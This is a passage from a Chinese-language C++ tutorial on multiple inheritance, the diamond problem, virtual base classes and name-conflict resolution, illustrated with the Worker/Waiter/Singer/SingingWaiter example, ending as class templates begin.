成员来使其变为 <code>private</code>）。</p><p><code>using</code> 声明提供了一种在私有/保护继承下选择性地暴露基类接口的方法，但过度使用可能会破坏原本隐藏实现的意图。</p><h2 id="14-3-多重继承"><a href="#14-3-多重继承" class="headerlink" title="14.3 多重继承"></a>14.3 多重继承</h2><p><strong>多重继承 (Multiple Inheritance, MI)</strong> 允许一个派生类从<strong>多个</strong>基类继承。这意味着派生类可以同时拥有多个基类的特性和接口。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedClassName</span> :</span> accessSpecifier1 BaseClass1, accessSpecifier2 BaseClass2, ... &#123;</span><br><span class="line">    <span class="comment">// ... 派生类成员 ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  在类头中列出所有要继承的基类，用逗号分隔。</li><li>  可以为每个基类指定不同的访问说明符（<code>public</code>, <code>protected</code>, <code>private</code>）。</li></ul><p><strong>示例场景:</strong></p><p>假设我们有一个通用的 <code>Worker</code> 类，表示工作人员的基本信息。我们还有 <code>Singer</code> 类表示歌手，<code>Waiter</code> 类表示服务员。现在我们想创建一个 <code>SingingWaiter</code> 类，表示一个既会唱歌又能提供服务的服务员。<code>SingingWaiter</code> 可以同时继承 <code>Singer</code> 和 <code>Waiter</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Worker</span> &#123;</span> <span class="comment">/* ... id, name ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> &#123;</span> <span class="comment">/* ... voice range, sing() ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> &#123;</span> <span class="comment">/* ... panache, serve() ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SingingWaiter 继承自 Singer 和 Waiter</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Singer, <span class="keyword">public</span> Waiter &#123;</span><br><span class="line">    <span class="comment">// ... SingingWaiter 特有的成员 ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>潜在问题:</strong></p><p>多重继承虽然强大，但也引入了一些复杂性和潜在的问题：</p><h3 id="14-3-1-有多少-Worker-钻石问题-Diamond-Problem"><a href="#14-3-1-有多少-Worker-钻石问题-Diamond-Problem" class="headerlink" title="14.3.1 有多少 Worker (钻石问题 - Diamond Problem)"></a>14.3.1 有多少 Worker (钻石问题 - Diamond Problem)</h3><p>如果多个基类是从<strong>同一个</strong>更远的基类派生而来的，那么派生类将包含该共同基类的<strong>多个副本</strong>（每个继承路径一个）。这被称为<strong>钻石问题</strong>或<strong>菱形继承</strong>。</p><p><strong>示例:</strong> 假设 <code>Singer</code> 和 <code>Waiter</code> 都继承自 <code>Worker</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Worker</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> fullname;</span><br><span class="line">    <span class="keyword">virtual</span> ~Worker() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">/* ... show id, name ... */</span> &#125;</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> :</span> <span class="keyword">public</span> Worker &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> panache;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="comment">/* ... show worker info + panache ... */</span> &#125;</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> :</span> <span class="keyword">public</span> Worker &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span>other, alto, contralto, soprano, bass, baritone, tenor&#125;;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> Vtypes = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> voice;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="comment">/* ... show worker info + voice ... */</span> &#125;</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SingingWaiter 继承自 Waiter 和 Singer，两者都继承自 Worker</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Waiter, <span class="keyword">public</span> Singer &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="comment">/* ... show all info ... */</span> &#125;</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这种情况下，一个 <code>SingingWaiter</code> 对象内部会包含<strong>两个</strong> <code>Worker</code> 子对象：一个来自 <code>Waiter</code> 的继承路径，另一个来自 <code>Singer</code> 的继承路径。</p><p>这会导致几个问题：</p><ol><li><p><strong>成员访问歧义:</strong> 如果你想访问 <code>SingingWaiter</code> 对象的 <code>id</code> 或 <code>fullname</code>（来自 <code>Worker</code>），编译器不知道你指的是哪个 <code>Worker</code> 子对象的成员。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SingingWaiter sw;</span><br><span class="line"><span class="comment">// sw.id = 123; // 错误！歧义：Waiter::Worker::id 还是 Singer::Worker::id？</span></span><br></pre></td></tr></table></figure></li><li><p> <strong>资源冗余:</strong> <code>Worker</code> 的数据成员被存储了两次，造成浪费。</p></li></ol><p><strong>解决方案：虚基类 (Virtual Base Classes)</strong></p><p>为了解决钻石问题，C++ 引入了<strong>虚基类</strong>的概念。当一个类被声明为虚基类时，派生类在通过<strong>多条路径</strong>继承该基类时，只会包含该虚基类的<strong>一个</strong>共享子对象副本。</p><ul><li><p><strong>语法:</strong> 在派生类继承虚基类时，使用 <code>virtual</code> 关键字。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Waiter 和 Singer 将 Worker 作为虚基类继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Worker &#123; <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Worker &#123; <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SingingWaiter 正常继承 Waiter 和 Singer</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Waiter, <span class="keyword">public</span> Singer &#123; <span class="comment">/* ... */</span> &#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>效果:</strong> 现在，<code>SingingWaiter</code> 对象只包含<strong>一个</strong>共享的 <code>Worker</code> 子对象。访问 <code>id</code> 或 <code>fullname</code> 不再有歧义。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SingingWaiter sw;</span><br><span class="line">sw.id = <span class="number">123</span>; <span class="comment">// OK！只有一个 Worker 子对象，没有歧义。</span></span><br></pre></td></tr></table></figure></li><li><p><strong>构造函数责任:</strong> 当使用虚基类时，<strong>最底层的派生类</strong>（在这个例子中是 <code>SingingWaiter</code>）的构造函数<strong>负责</strong>调用虚基类（<code>Worker</code>）的构造函数。中间的基类（<code>Waiter</code>, <code>Singer</code>）在其初始化列表中对虚基类的构造函数调用会被忽略（除非该中间类是直接创建对象）。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SingingWaiter 构造函数需要初始化 Worker</span></span><br><span class="line">SingingWaiter::SingingWaiter(<span class="keyword">const</span> Worker &amp; wk, <span class="keyword">int</span> p, <span class="keyword">int</span> v)</span><br><span class="line">    : Worker(wk), <span class="comment">// 显式调用虚基类构造函数</span></span><br><span class="line">      Waiter(wk, p),</span><br><span class="line">      Singer(wk, v) &#123;</span><br><span class="line">    <span class="comment">// Waiter(wk, p) 和 Singer(wk, v) 内部对 Worker 的构造调用会被忽略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="14-3-2-哪个方法-成员名冲突"><a href="#14-3-2-哪个方法-成员名冲突" class="headerlink" title="14.3.2 哪个方法 (成员名冲突)"></a>14.3.2 哪个方法 (成员名冲突)</h3><p>即使没有钻石问题，如果不同的基类提供了同名的方法或数据成员，派生类在调用该成员时也会产生<strong>歧义</strong>。</p><p><strong>示例:</strong> 假设 <code>Waiter</code> 和 <code>Singer</code> 都有一个名为 <code>Talent()</code> 的方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Talent</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Serves with style.\n&quot;</span>; &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Talent</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sings beautifully.\n&quot;</span>; &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Waiter, <span class="keyword">public</span> Singer &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SingingWaiter sw;</span><br><span class="line"><span class="comment">// sw.Talent(); // 错误！歧义：Waiter::Talent() 还是 Singer::Talent()？</span></span><br></pre></td></tr></table></figure><p><strong>解决方案：使用作用域解析运算符 (<code>::</code>)</strong></p><p>为了解决这种歧义，需要使用作用域解析运算符明确指定要调用哪个基类的版本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sw.Waiter::Talent(); <span class="comment">// 调用 Waiter 版本的 Talent()</span></span><br><span class="line">sw.Singer::Talent(); <span class="comment">// 调用 Singer 版本的 Talent()</span></span><br></pre></td></tr></table></figure><p><strong>虚函数和歧义:</strong></p><p>如果冲突的方法是<strong>虚函数</strong>，情况会更复杂一些。</p><ul><li><p>  如果只有<strong>一个</strong>基类提供了该虚函数，或者所有提供该虚函数的基类都继承自<strong>同一个</strong>（可能是虚）基类的同一个虚函数，那么通过派生类对象调用通常没有歧义（动态联编会起作用）。</p></li><li><p>但是，如果不同的基类提供了<strong>签名相同但无关</strong>的虚函数，或者派生类想提供一个<strong>覆盖所有</strong>基类版本的新版本，情况会变得复杂。通常建议在派生类中提供一个新的虚函数，并显式调用所需的基类版本。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// workermi.h, workermi.cpp, worktest.cpp 示例 (模拟 Worker 层次结构)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// worker0.h - 基类 Worker</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WORKER0_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORKER0_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="comment">// ... (Worker 定义，包含虚函数 Show() 和 Set()) ...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// workermi.h - MI 相关类</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WORKERMI_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORKERMI_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;worker0.h&quot;</span> <span class="comment">// 包含基类</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Worker &#123; <span class="comment">// 虚继承</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> panache;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Data</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Get</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Waiter() : Worker(), panache(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">    Waiter(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">long</span> n, <span class="keyword">int</span> p = <span class="number">0</span>)</span><br><span class="line">             : Worker(s, n), panache(p) &#123;&#125;</span><br><span class="line">    Waiter(<span class="keyword">const</span> Worker &amp; wk, <span class="keyword">int</span> p = <span class="number">0</span>)</span><br><span class="line">             : Worker(wk), panache(p) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Set</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Worker &#123; <span class="comment">// 虚继承</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span>other, alto, contralto, soprano, bass, baritone, tenor&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span>Vtypes = <span class="number">7</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Data</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Get</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *pv[Vtypes]; <span class="comment">// string equivs of voice types</span></span><br><span class="line">    <span class="keyword">int</span> voice;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Singer() : Worker(), voice(other) &#123;&#125;</span><br><span class="line">    Singer(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">long</span> n, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(s, n), voice(v) &#123;&#125;</span><br><span class="line">    Singer(<span class="keyword">const</span> Worker &amp; wk, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(wk), voice(v) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Set</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多重继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Singer, <span class="keyword">public</span> Waiter &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Data</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Get</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    SingingWaiter() &#123;&#125;</span><br><span class="line">    <span class="comment">// 显式调用虚基类 Worker 的构造函数</span></span><br><span class="line">    SingingWaiter(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">long</span> n, <span class="keyword">int</span> p = <span class="number">0</span>, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(s, n), Waiter(s, n, p), Singer(s, n, v) &#123;&#125;</span><br><span class="line">    SingingWaiter(<span class="keyword">const</span> Worker &amp; wk, <span class="keyword">int</span> p = <span class="number">0</span>, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(wk), Waiter(wk, p), Singer(wk, v) &#123;&#125;</span><br><span class="line">    SingingWaiter(<span class="keyword">const</span> Waiter &amp; wt, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(wt), Waiter(wt), Singer(wt, v) &#123;&#125; <span class="comment">// 从 Waiter 构造</span></span><br><span class="line">    SingingWaiter(<span class="keyword">const</span> Singer &amp; sg, <span class="keyword">int</span> p = <span class="number">0</span>)</span><br><span class="line">             : Worker(sg), Waiter(sg, p), Singer(sg) &#123;&#125; <span class="comment">// 从 Singer 构造</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Set</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// workermi.cpp - 实现 (部分)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;workermi.h&quot;</span></span></span><br><span class="line"><span class="comment">// ... Worker 实现 ...</span></span><br><span class="line"><span class="comment">// --- Waiter methods ---</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Waiter::Set</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Worker::Get(); <span class="comment">// 调用基类方法获取基本信息</span></span><br><span class="line">    Get();         <span class="comment">// 调用自己的 Get 获取 panache</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Waiter::Show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Worker::Show(); <span class="comment">// 调用基类方法显示基本信息</span></span><br><span class="line">    Data();         <span class="comment">// 调用自己的 Data 显示 panache</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Waiter::Data</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">/* show panache */</span> &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Waiter::Get</span><span class="params">()</span> </span>&#123; <span class="comment">/* get panache */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Singer methods ---</span></span><br><span class="line"><span class="comment">// ... (类似实现 Set, Show, Data, Get) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- SingingWaiter methods ---</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SingingWaiter::Data</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Singer::Data(); <span class="comment">// 显示 Singer 的数据</span></span><br><span class="line">    Waiter::Data(); <span class="comment">// 显示 Waiter 的数据</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SingingWaiter::Get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Waiter::Get(); <span class="comment">// 获取 Waiter 的数据</span></span><br><span class="line">    Singer::Get(); <span class="comment">// 获取 Singer 的数据</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SingingWaiter::Set</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Worker::Get(); <span class="comment">// 获取 Worker 的数据 (只需要一次，因为是虚基类)</span></span><br><span class="line">    Get();         <span class="comment">// 调用 SingingWaiter::Get() 获取 Waiter 和 Singer 的数据</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SingingWaiter::Show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Worker::Show(); <span class="comment">// 显示 Worker 的数据 (只需要一次)</span></span><br><span class="line">    Data();         <span class="comment">// 调用 SingingWaiter::Data() 显示 Waiter 和 Singer 的数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// worktest.cpp - 使用示例</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;workermi.h&quot;</span></span></span><br><span class="line"><span class="comment">// ... (main 函数创建 Worker*, Waiter*, Singer*, SingingWaiter* 数组，并通过基类指针调用 Set 和 Show) ...</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="14-3-3-MI-小结"><a href="#14-3-3-MI-小结" class="headerlink" title="14.3.3 MI 小结"></a>14.3.3 MI 小结</h3><p><strong>优点:</strong></p><ul><li>  可以组合多个不同类的功能。</li><li>  允许更灵活的类层次结构设计。</li></ul><p><strong>缺点:</strong></p><ul><li>  <strong>复杂性增加:</strong> 可能导致名称冲突和歧义。</li><li>  <strong>钻石问题:</strong> 需要使用虚基类来解决，这会增加构造函数实现的复杂性，并可能引入额外的运行时开销。</li><li>  <strong>难以理解和维护:</strong> 复杂的 MI 层次结构可能难以理解和调试。</li></ul><p><strong>设计建议:</strong></p><ul><li>  <strong>谨慎使用:</strong> 多重继承是一个强大的工具，但也容易被滥用。在决定使用 MI 之前，仔细考虑是否有更简单的替代方案（如包含/组合，或者单继承加接口）。</li><li>  <strong>优先考虑组合:</strong> 对于 “has-a” 关系，组合通常是更简单、更安全的选择。</li><li>  <strong>虚基类:</strong> 如果确实需要 MI 并且遇到了钻石问题，务必使用虚基类。</li><li>  <strong>明确解决歧义:</strong> 使用作用域解析运算符 (<code>::</code>) 来解决成员名称冲突。</li></ul><p>许多现代 C++ 实践倾向于避免复杂的多重继承，尤其是在应用层面。然而，在某些库设计（如 IO 流库）或需要混合不同抽象接口的场景中，MI 仍然是一个有用的工具。</p><h2 id="14-4-类模板"><a href="#14-4-类模板" class="headerlink" title="14.4 类模板"></a>14.4 类模板</h2><p>就像函数模板允许我们编写通用的函数，可以处理不同类型的数据一样，<strong>类模板 (Class Templates)</strong> 允许我们定义通用的类蓝图，可以用来创建处理不同数据类型的类。</p><p>类模板是参数化的类定义，其中的某些类型（或值）在定义时是未指定的，而在创建类的实例（对象）时才被指定。这极大地提高了代码的重用性，是泛型编程的核心。STL 中的容器（如 <code>vector</code>, <code>list</code>, <code>map</code>）和智能指针等都是类模板的典型应用。</p><h3 id="14-4-1-定义类模板"><a href="#14-4-1-定义类模板" class="headerlink" title="14.4.1 定义类模板"></a>14.4.1 定义类模板</h3><p>定义类模板的语法与函数模板类似，使用 <code>template</code> 关键字，后跟尖括号 <code>&lt;&gt;</code> 中的模板参数列表。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2, ...&gt; <span class="comment">// 或者 template &lt;class T1, class T2, ...&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line">    